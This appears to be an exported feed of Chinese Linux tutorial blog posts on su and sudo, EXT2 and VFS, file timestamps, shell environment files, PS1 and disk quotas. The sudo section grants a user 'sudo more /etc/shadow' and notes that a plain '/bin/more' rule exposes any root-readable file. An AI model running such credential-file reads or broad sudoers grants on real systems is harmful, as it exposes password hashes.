&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更多帮助，参考: 1man su 三、su 的范例：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 在不加任何参数，默认为切换到 root 用户，但没有转到 root 用户家目录下，也就是说这时虽然是切换为 root 用户了，但并没有改变 root 登录环境；用户默认的登录环境，可以在 /etc/passwd 中查看，包括家目录， SHELL 定义等； 1234[beinan@localhost ~]?$ suPassword:[root@localhost beinan]# pwd/home/beinan &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 加参数 - ，表示默认切换到 root 用户，并且改变到 root 用户的环境变量； 123456[beinan@localhost ~]?$ pwd/home/beinan[beinan@localhost ~]?$ su -Password:[root@localhost ~]# pwd/root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 参数 - 用户名 123456789101112131415161718[beinan@localhost ~]?$ su - root 注：这个和su - 是一样的功能；Password:[root@localhost ~]# pwd/root[beinan@localhost ~]?$ su - linuxsir 注：这是切换到 linuxsir用户Password: 注：在这里输入密码；[linuxsir@localhost ~]?$ pwd 注：查看用户当前所处的位置；/home/linuxsir[linuxsir@localhost ~]?$ id 注：查看用户的UID和GID信息，主要是看是否切换过来了；uid=505(linuxsir) gid=502(linuxsir) groups=0(root),500(beinan),502(linuxsir)[linuxsir@localhost ~]?$[beinan@localhost ~]?$ su - -c ls 注：这是su的参数组合，表示切换到root用户，并且改变到root环境，然后列出root家目录的文件，然后退出root用户；Password: 注：在这里输入root的密码；anaconda-ks.cfg Desktop install.log install.log.syslog testgroup testgroupbeinan testgrouproot[beinan@localhost ~]?$ pwd 注：查看当前用户所处的位置；/home/beinan[beinan@localhost ~]?$ id 注：查看当前用户信息；uid=500(beinan) gid=500(beinan) groups=500(beinan) 四、su 的优缺点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 的确为管理带来方便，通过切换到 root 下，能完成所有系统管理工具，只要把 root 的密码交给任何一个普通用户，它都能切换到 root 来完成所有的系统管理工作；但通过 su 切换到 root 后，也有不安全因素；比如系统有10个用户，而且都参与管理。如果这10个用户都涉及到超级权限的运用，作为管理员如果想让其他用户通过 su 来切换到 超级权限的 root ，必须把 root 权限密码都告诉这10个用户、如果这10个用户都有 root 权限，通过 root 权限可以做任何事，这在一定程度上就对系统的安全造成了威胁，简直是噩梦；“没有不安全的系统，只有不安全的人” ，绝对不能保证这10个用户都能按正常操作流程来管理系统，其中任何一个人对系统操作的重大失误，都可能导致系统崩溃或数据丢失；所以 su 工具在多人参与的系统管理中，并不hi是最好的选择，su 只适合于一两个人参与管理的系统，毕竟 su 并不能让普通用户受限的使用；超级用户 root 密码应该掌握在少数用户手中，这绝对是真理！所以集权而治的存在是有一定道理的。 sudo 授权许可使用的 su ，也是受限制的 su一、sudo 的适用条件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于su 对切换到超级权限用户root后，权限的无限制性，所以su并不能担任多个管理员所管理的系统。如果用su 来切换到超级用户来管理系统，也不能明确哪些工作是由哪个管理员进行的操作。特别是对于服务器的管理有多人参与管理时，最好是针对每个管理员的技术特长和管理范围，并且有针对性的下放给权限，并且约定其使用哪些工具来完成与其相关的工作，这时我们就有必要用到 sudo。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过sudo，我们能把某些超级权限有针对性的下放，并且不需要普通用户知道root密码，所以sudo 相对于权限无限制性的su来说，还是比较安全的，所以sudo 也能被称为受限制的su ；另外sudo 是需要授权许可的，所以也被称为授权许可的su；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo 执行命令的流程是当前用户切换到root（或其它指定切换到的用户），然后以root（或其它指定的切换到的用户）身份执行命令，执行完成后，直接退回到当前用户；而这些的前提是要通过sudo的配置文件/etc/sudoers来进行授权；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如我们想用beinan普通用户通过more /etc/shadow文件的内容时，可能会出现下面的情况； 12[beinan@localhost ~]?$ more /etc/shadow/etc/shadow: 权限不够 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时我们可以用sudo more /etc/shadow 来读取文件的内容；就就需要在/etc/soduers中给beinan授权&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;于是我们就可以先su 到root用户下通过visudo 来改/etc/sudoers ；（比如我们是以beinan用户登录系统的） 12[beinan@localhost ~]?$ suPassword: 注：在这里输入root密码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面运行 visudo 1[root@localhost beinan]# visudo 注：运行visudo 来改 /etc/sudoers &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入如下一行，退出保存；退出保存，在这里要会用vi，visudo也是用的vi编辑器；至于vi的用法不多说了；beinan ALL=/bin/more 表示beinan可以切换到root下执行more 来查看文件；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退回到beinan用户下，用exit命令； 123[root@localhost beinan]# exitexit[beinan@localhost ~]?$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看beinan的通过sudo能执行哪些命令？ 1234[beinan@localhost ~]?$ sudo -lPassword: 注：在这里输入beinan用户的密码User beinan may run the following commands on this host: 注：在这里清晰的说明在本台主机上，beinan用户可以以root权限运行more ；在root权限下的more ，可以查看任何文本文件的内容的；(root) /bin/more &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，我们看看是不是beinan用户有能力看到/etc/shadow文件的内容； 1[beinan@localhost ~]?$ sudo more /etc/shadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;beinan 不但能看到 /etc/shadow文件的内容，还能看到只有root权限下才能看到的其它文件的内容，比如； 1[beinan@localhost ~]?$ sudo more /etc/gshadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于beinan用户查看和读取所有系统文件中，我只想把/etc/shadow 的内容可以让他查看；可以加入下面的一行； 1beinan ALL=/bin/more /etc/shadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;题外话：有的弟兄会说，我通过su 切换到root用户就能看到所有想看的内容了，哈哈，对啊。但咱们现在不是在讲述sudo的用法吗？如果主机上有多个用户并且不知道root用户的密码，但又想查看某些他们看不到的文件，这时就需要管理员授权了；这就是sudo的好处； 实例：练习用户组在/etc/sudoers中写法；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果用户组出现在/etc/sudoers 中，前面要加%号，比如%beinan ，中间不能有空格；%beinan ALL=/usr/sbin/*,/sbin/*&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果我们在 /etc/sudoers 中加上如上一行，表示beinan用户组下的所有成员，在所有可能的出现的主机名下，都能切换到root用户下运行 /usr/sbin和/sbin目录下的所有命令； 实例：练习取消某类程序的执行：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;取消程序某类程序的执行，要在命令动作前面加上!号； 在本例中也出现了通配符的*的用法； 1beinan ALL=/usr/sbin/*,/sbin/*,!/usr/sbin/fdisk 注：把这行规则加入到/etc/sudoers中；但您得有beinan这个用户组，并且beinan也是这个组中的才行； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本规则表示beinan用户在所有可能存在的主机名的主机上运行/usr/sbin和/sbin下所有的程序，但fdisk 程序除外； 12345[beinan@localhost ~]?$ sudo -lPassword: 注：在这里输入beinan用户的密码；User beinan may run the following commands on this host:(root) /usr/sbin/*(root) /sbin/*(root) !/sbin/fdisk[beinan@localhost ~]?$ sudo /sbin/fdisk -lSorry, user beinan is not allowed to execute '/sbin/fdisk -l' as root on localhost. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：不能切换到root用户下运行fdisk 程序；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果有sudo 的权限而没有su的权限: sudo su;]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件系统百科]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F25.%20Linux%20%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%99%BE%E7%A7%91%2F</url>
    <content type="text"><![CDATA[Linux 文件系统百科&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux文件系统中的文件是数据的集合，文件系统不仅包含着文件中的数据而且还有文件系统的结构，所有Linux 用户和程序看到的文件、目录、软连接及文件保护信息等都存储在其中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 最早的文件系统是Minix，但是专门为Linux 设计的文件系统——扩展文件系统第二版或EXT2被设计出来并添加到Linux中，这对Linux产生了重大影响。EXT2文件系统功能强大、易扩充、性能上进行了全面优化，也是所有Linux发布和安装的标准文件系统类型。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个实际文件系统从操作系统和系统服务中分离出来，它们之间通过一个接口层：虚拟文件系统或VFS来通讯。VFS使得Linux可以支持多个不同的文件系统，每个表示一个VFS 的通用接口。由于软件将Linux 文件系统的所有细节进行了转换,所以Linux核心的其它部分及系统中运行的程序将看到统一的文件系统。Linux 的虚拟文件系统允许用户同时能透明地安装许多不同的文件系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux文件系统中，作为一种特殊类型/proc文件系统只存在内存当中，而不占用内存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。/proc文件系统是一个伪文件系统，用户和应用程序可以通过/proc得到系统的信息，并可以改变内核的某些参数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux文件系统中，EXT2文件系统、虚拟文件系统、/proc文件系统是三个具有代表性的文件系统，本论文试图通过对他们的分析来研究Linux文件系统机制。并且在分析这三种文件系统的基础上对Linux文件系统操作进行了解、研究（本论文选取了open和close两种操作进行研究）。在第二部分中将介绍EXT2文件系统；第三部分论述虚拟文件系统的特点；第四部分简要介绍/proc文件系统；最后，介绍两种具体文件系统操作的实现。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux中普通文件和目录文件保存在称为块物理设备的磁盘或者磁带上。一套Linux系统支持若干物理盘，每个物理盘可定义一个或者多个文件系统。（类比于微机磁盘分区）。每个文件系统由逻辑块的序列组成，一个逻辑盘空间一般划分为几个用途各不相同的部分，即引导块、超级块、inode区以及数据区等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;引导块：在文件系统的开头，通常为一个扇区，其中存放引导程序，用于读入并启动操作系统；超级块：用于记录文件系统的管理信息。特定的文件系统定义了特定的超级块；inode区（索引节点）：一个文件或目录占据一个索引节点。第一个索引节点是该文件系统的根节点。利用根节点，可以把一个文件系统挂在另一个文件系统的非叶节点上；数据区：用于存放文件数据或者管理数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux最早引入的文件系统类型是MINIX。MINIX文件系统由MINIX操作系统定义，有一定的局限性，如文件名最长14个字符，文件最长64M字节。第一个专门为Linux设计的文件系统是EXT（Extended File System），但目前流行最广的是EXT2。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二代扩展文件系统由Rey Card 设计，其目标是为Linux 提供一个强大的可扩展文件系统。它同时也是Linux界中设计最成功的文件系统。通过VFS的超级块（struct ext2_sb_info ext2_sb）可以访问EXT2的超级块，通过VFS的inode（struct ext2_inode_info ext2_i）可以访问EXT2的inode。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件系统EXT2的源代码在/usr/src/linux/fs/ext2目录下，它的数据结构在文件/usr/src/linux/include/linux/ext2_fs.h以及同一目录下的文件ext2_fs_i.h和ext2_fs_sb.h中定义。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;EXT2文件系统将它所占用的逻辑分区划分成块组（block group），如下图所示： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;和很多文件系统一样, EXT2 建立在数据被保存在数据块中的文件内这个前提下。这些数据块长度相等且这个长度可以变化，某个EXT2 文件系统的块大小在创建（使用mke2fs）时设置。每个文件的大小和刚好大于它的块大小正数倍相等。如果块大小为1024 字节而一个1025 字节长的文件将占据两个1024 字节大小的块。这样你不得不浪费差不多一半的空间。我们通常需要在CPU 的内存利用率和磁盘空间使用上进行折中。而大多数操作系统，包括Linux 在内，为了减少CPU 的工作负载而被迫选择相对较低的磁盘空间利用率。并不是文件中每个块都包含数据，其中有些块被用来包含描叙此文件系统结构的信息。EXT2通过一个inode 结构来描叙文件系统中文件并确定此文件系统的拓扑结构。inode 结构描叙文件中数据占据哪个块以及文件的存取权限、文件修改时间及文件类型。EXT2 文件系统中的每个文件用一个inode 来表示且每个inode 有唯一的编号。文件系统中所有的inode都被保存在inode 表中。 EXT2 目录仅是一个包含指向其目录入口指针的特殊文件（也用inode表示）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对文件系统而言文件仅是一系列可读写的数据块。文件系统并不需要了解数据块应该放置到物理介质上什么位置，这些都是设备驱动的任务。无论何时只要文件系统需要从包含它的块设备中读取信息或数据，它将请求底层的设备驱动读取一个基本块大小整数倍的数据块。EXT2 文件系统将它所使用的逻辑分区划分成数据块组。每个数据块组将那些对文件系统完整性最重要的信息复制出来, 同时将实际文件和目录看作信息与数据块。为了发生灾难性事件时文件系统的修复，这些复制非常有必要。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件的三个时间属性]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F15.%20Linux%20%E4%B8%89%E4%B8%AA%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7%2F</url>
    <content type="text"><![CDATA[Linux 文件的三个时间属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;平时通常同find命令找一些文件时会用到这些参数。那么这三个参数到底有啥区别呢。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件的 Access time，atime 是在读取文件或者执行文件时更改的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件的 Modified time，mtime 是在写入文件时随文件内容的更改而更改的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件的 Change time，ctime 是在写入文件、更改所有者、权限或链接设置时随 Inode 的内容更改而更改的。 modify time（mtime）创建或更改的时间access time (atime) 访问的时间change time (ctime) 更改原数据（inode号，属性，权限等）的时间 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此，更改文件的内容即会更改 mtime 和 ctime，但是文件的 ctime 可能会在 mtime 未发生任何变化时更改，如权限更改了但文件内容没有更改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls(1) 命令可用来列出文件的 atime、ctime 和 mtime。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls -lc filename 列出文件的 ctime &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls -lu filename 列出文件的 atime &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls -l filename 列出文件的 mtime 12345678ls -l filename（ls默认显示的是mtime） -rw-rw-r-- 1 lawrance lawrance 27 Oct 5 02:09 filename ls -l --time=ctime filename -rwxr-xr-x 1 lawrance lawrance 27 Oct 6 02:50 filename ls -l --time=atime filename -rw-rw-r-- 1 lawrance lawrance 27 Oct 6 02:30 filename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、访问时间，每次读取文件的内容，时间就会更新。比如对这个文件运用 more、cat等命令。ls、stat命令都不会修改文件的访问时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、修改时间，修改时间是文件内容最后一次被修改时间。比如：vi后保存文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3、状态改动时间。文件属性最后一次被修改的时间，通过chmod、chown命令修改一次文件属性，这个时间就会更新。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;atime不一定在访问文件之后被修改，因为：使用ext3文件系统的时候，如果在mount的时候使用了noatime参数那么就不会更新atime的信息。而这是加了 noatime 取消了, 不代表真实情況。反正, 这三个 time stamp 都放在 inode 中. 若 mtime, atime 修改, inode 就一定會改, 既然 inode 改了, 那 ctime 也就跟著要改了（理论上是这样的，但是真实情况并非如此，如果是读取文档或者执行二进制文件的时候，虽然atime会变，但ctime不变，这是系统这样设计的）.]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系统和用户的环境变量配置文件]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F17.%20%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%94%A8%E6%88%B7%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[系统和用户的环境变量配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux系统中，有很多系统的变量，这些变量被存在 /etc/profile: 这个文件预设了几个重要的变量，例如 PATH , USER , LOGNAME , MAIL , INPUTRC , HOSTNAME , HISTSIZE , umake等等。 /etc/bashrc: 这个文件主要预设umake以及PS1。这个PS1就是我们在敲命令的时，前面那串字符了，例如CentOS root用户默认PS1就是[root@localhost~]#，PS1的值。 12[root@localhost ~]# echo $PS1[\u@\h \W]\$ /u 就是用户，/h 主机名，/W 则是当前目录，/$ 就是那个‘#’了。如果普通用户显示为‘$’。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了两个系统级别的配置文件外，每个用户的主目录下还有几个这样的隐藏文件： .bash_proffile: 定义了用户的个人划路径与环境变量的文件名称。每个用户都可使用该文件输入专用于自己使用的shell信息，当用户登录时，该文件仅仅执行一次。 .bash_history: 记录命令历史用的。 .bash_logout: 当退出shell时，会执行该文件。可以把一些清理的工作放到这个文件中。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 环境变量之“PS1”]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F16.%20Linux%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B9%8B%E2%80%9CPS1%E2%80%9D%2F</url>
    <content type="text"><![CDATA[Linux 环境变量之“PS1”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS1（是数字1而不是字母l），每个版本bash的PS1变量内的特殊符号可能有些小的差异，你可以先man bash 一下。下面是FC4环境下默认的特殊符号所代表的意义： \d ：代表日期，格式为weekday month date，例如：”Mon Aug 1” \H ：完整的主机名称。例如：我的机器名称为：fc4.linux，则这个名称就是fc4.linux \h ：仅取主机的第一个名字，如上例，则为fc4，.linux则被省略 \t ：显示时间为24小时格式，如：HH：MM：SS \T ：显示时间为12小时格式 \A ：显示时间为24小时格式：HH：MM \u ：当前用户的账号名称 \v ：BASH的版本信息 \w ：完整的工作目录名称。家目录会以 ~代替 \W ：利用basename取得工作目录名称，所以只会列出最后一个目录 \# ：下达的第几个命令 \$ ：提示字符，如果是root时，提示符为：# ，普通用户则为：$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认的PS1内容为： ‘[\u@\h \W]\$ ‘ ，所以默认的提示符就是： [root@localhost ~]# 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但设置PS1的时候需要稍微处理一下 1PS1="[\\u@\\h \\W]\\$ " &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样显示的结果才是正确的]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磁盘配额]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F27.%E7%A3%81%E7%9B%98%E9%85%8D%E9%A2%9D%2F</url>
    <content type="text"><![CDATA[磁盘配额&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘配合其实就是给每个用户分配一定的磁盘额度，只允许他使用这个额度范围内的磁盘空间。在linux系统中，是多用户多任务的环境，所以会有很多人共用一个磁盘的情况。针对每个用户去限定一定量的磁盘空间是有必要的，这样才显得公平。随着硬件成本的降低，服务器上的磁盘资源似乎不再刻意的去限制了，所以磁盘配额也就可有可无了，但是也需要了解一下这部分内容，用到时必须会操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux中，用来管理磁盘配额的东西就是quota了。如果linux上没有quota，则需要安装这个软件包 quota-3.13-5.el5.RPM （其实版本是多少无所谓了，关键是这个软件包）。quota在实际应用中是针对整个分区进行限制的。比如，如果我们限制了/dev/sdb1这个分区，而/dev/sdb1 是挂载在/home 目录下的，那么/home 所有目录都会受到限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;quota 这个模块主要分为quota 、quotacheck 、quotaoff 、quotaon 、quotastats 、edquota 、setquota 、warnquota 、repquota这几个命令，下面就分别介绍这些命令。 命令 : quota&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“quota” 用来显示某个组或者某个使用者的限额。 语法：1quota [-guvs] [user,group] 基本参数 -g 显示某个组的限额 -u 显示某个用户的限额 -v 显示的意思 -s 选择inod或硬盘空间来显示 命令 : quotacheck&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“quotacheck” 用来扫描某一个磁盘的quota空间。 语法：1quotacheck [-auvg] /path 基本参数 -a 扫描所有已经mount的具有quota支持的磁盘 -u 扫描某个使用者的文件以及目录 -g 扫描某个组的文件以及目录 -v 显示扫描过程 -m 强制进行扫描 命令 : edquota&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“edquota” 用来编辑某个用户或者组的quota值。 语法：1edquota [-u user] [-g group] [-t] 基本参数 -u 编辑某个用户的quota -g 编辑某个组的quota -t 编辑宽限时间 -p 拷贝某个用户或组的quota到另一个用户或组 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当运行 edquota -u user 时，系统会打开一个文件，你会看到这个文件中有7列，它们分别代表的含义是： “Filesystem” 磁盘分区，如/dev/sdb5 “blocks” 当前用户在当前的Filesystem中所占用的磁盘容量，单位是Kb。该值请不要修改。 “soft/hard” 当前用户在该Filesystem内的quota值，soft指的是最低限额，可以超过这个值，但必须要在宽限时间内将磁盘容量降低到这个值以下。hard指的是最高限额，即不能超过这个值。当用户的磁盘使用量高于soft值时，系统会警告用户，提示其要在宽限时间内把使用空间降低到soft值之下。 “inodes” 目前使用掉的inode的状态，不用修改。 命令 : quotaon&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“quotaon” 用来启动quota，在编辑好quota后，需要启动才能是quota生效 语法：1quotaon [-a] [-uvg directory] 基本参数 -a 全部设定的quota启动 -u 启动某个用户的quota -g 启动某个组的quota -s 显示相关信息 命令 : quotaoff&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“quotaoff” 用来关闭quota, 该命令常用只有一种情况 quotaoff -a 关闭全部的quota. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上讲了很多quota的相关命令，那么接下来阿铭教你如何在实践应用中去做这个磁盘配额。整个执行过程如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先先确认一下，/home目录是不是单独的挂载在一个分区下，用df 查看即可。 1234文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda3 14347632 1899376 11719424 14% /tmpfs 163308 0 163308 0% /dev/shm/dev/sda1 99150 26808 67222 29% /boot &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例linux系统中，/home并没有单独占用一个分区。所以需要把/home目录挂载在一个单独的分区下，因为quota是针对分区来限额的。下面把 /dev/sdb5 挂载到/home 目录下， 编辑 /etc/fstab 把刚才添加的那行修改为： 1UUID=c61117ca-9176-4d0b-be4d-1b0f434359a7 /home ext4 defaults 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存 /etc/fstab 后，运行 mount -a 命令挂载全部的分区。 1234567[root@localhost ~]# mount -a[root@localhost ~]# df -h文件系统 容量 已用 可用 已用%% 挂载点/dev/sda3 14G 1.9G 12G 14% /tmpfs 160M 0 160M 0% /dev/shm/dev/sda1 97M 27M 66M 29% /boot/dev/sdb5 989M 18M 921M 2% /home &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时的 /home 为一个单独分区了。 建立测试账户首先建立一个test用户，则同时建立了一个test组。其中uid和gid都为511 ，然后又建立一个test1账号，使其加入test组，查看/etc/passwd文件发现test和test1用户的gid都为511. 123456[root@localhost ~]# useradd test[root@localhost ~]# grep test /etc/passwdtest:x:511:511::/home/test:/bin/bash[root@localhost ~]# useradd -g 511 test1[root@localhost ~]# grep test1 /etc/passwdtest1:x:512:511::/home/test1:/bin/bash 打开磁盘的quota功能默认linux并没有对任何分区做quota的支持，所以需要我们手动打开磁盘的quota功能，你是否记得，在前面内容中分析/etc/fstab文件的第四列时讲过这个quota选项（usrquota, grpquota），没错，要想打开这个磁盘的quota支持就是需要修改这个第四列的。用vi编辑/etc/fstab 编辑刚才加的那一行，如下: 1UUID=c61117ca-9176-4d0b-be4d-1b0f434359a7 /home ext4 defaults,usrquota,grpquota 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存 /etc/fstab 后，重新挂载/home分区。 1234567891011[root@localhost ~]# umount /home/[root@localhost ~]# mount -a[root@localhost ~]# mount/dev/sda3 on / type ext4 (rw)proc on /proc type proc (rw)sysfs on /sys type sysfs (rw)devpts on /dev/pts type devpts (rw,gid=5,mode=620)tmpfs on /dev/shm type tmpfs (rw)/dev/sda1 on /boot type ext4 (rw)none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)/dev/sdb5 on /home type ext4 (rw,usrquota,grpquota) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 mount 命令可以查看到 /home 分区已经加上了 “usrquota,grpquota” 两个配额相关的参数。 扫描磁盘的使用者使用状况，并产生重要的aquota.group与aquota.user这一步就需要用到quotacheck了，aquota.group与aqouta.user分别是组以及用户磁盘配额需要的配置文件。如果没有这两个文件，则磁盘配额是不会生效的。 1[root@localhost ~]# quotacheck -augv &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可能会有一些错误信息，不要管它。看一看/home分区下是否多了两个文件(aquota.group, aquota.user) 12345678[root@localhost ~]# ll /home/总用量 44-rw------- 1 root root 7168 5月 12 02:07 aquota.group-rw------- 1 root root 8192 5月 12 02:07 aquota.userdrwxr-xr-x 2 root root 4096 5月 12 00:11 dir1drwx------ 2 root root 16384 5月 11 23:18 lost+founddrwx------ 3 test test 4096 5月 12 01:59 testdrwx------ 3 test1 test 4096 5月 12 02:00 test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果有了，则可以进入下一步了。 启动quota配额 123[root@localhost ~]# quotaon -av/dev/sdb5 [/home]: group quotas turned on/dev/sdb5 [/home]: user quotas turned on 编辑用户磁盘配额先来设定test账户的配额，然后直接把test的配额拷贝给test1即可。这里就需要用到edquota了。 1[root@localhost ~]# edquota -u test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将下面内容 1/dev/sdb5 20 0 0 5 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为： 1/dev/sdb5 20 20000 30000 5 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中单位是Kb，所以soft 值大约为20Mb，hard值为30Mb，保存这个文件，保存的方式跟vi一个文件的方式一样的。下面将test的配额复制给test1. 1[root@localhost ~]# edquota -p test test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面继续设定宽限时间： 1[root@localhost ~]# edquota -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将7days 改为 1days 1/dev/sdb5 1days 1days &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面查看一下test以及test1用户的配额吧。 1234567[root@localhost ~]# quota -uv test test1Disk quotas for user test (uid 511): Filesystem blocks quota limit grace files quota limit grace /dev/sdb5 20 20000 30000 5 0 0Disk quotas for user test1 (uid 512): Filesystem blocks quota limit grace files quota limit grace /dev/sdb5 20 20000 30000 5 0 0 编辑组磁盘配额 1[root@localhost ~]# edquota -g test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为： 1/dev/sdb5 40 40000 50000 10 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设定组test的soft配额值为40M，hard值为50M。下面查看组test的配额。 1234[root@localhost ~]# quota -gv testDisk quotas for group test (gid 511): Filesystem blocks quota limit grace files quota limit grace /dev/sdb5 40 40000 50000 10 0 0 设定开机启动前面已经讲到启动磁盘配额的命令是 quotaon -aug 所以要想开机启动，只需将这条命令加入到 /etc/rc.d/rc.local文件即可。 1[root@localhost ~]# echo "quotaon -aug" &gt;&gt; /etc/rc.d/rc.local]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装 CentOS]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F2.%20Linux%20%E5%AE%89%E8%A3%85%2F</url>
